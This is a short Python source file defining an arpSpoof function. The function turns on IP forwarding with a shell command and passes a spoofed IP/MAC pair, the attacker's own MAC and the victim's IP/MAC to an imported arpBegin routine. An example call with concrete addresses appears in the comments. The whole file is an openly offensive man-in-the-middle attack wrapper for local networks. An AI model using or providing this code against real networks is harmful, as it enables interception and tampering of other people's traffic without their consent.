from arpBegin import *
import os
#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
#ex: arpSpoof("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
def arpSpoof(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    return arpBegin(masq_ip, masq_mac, source_mac, dest_ip, dest_mac)
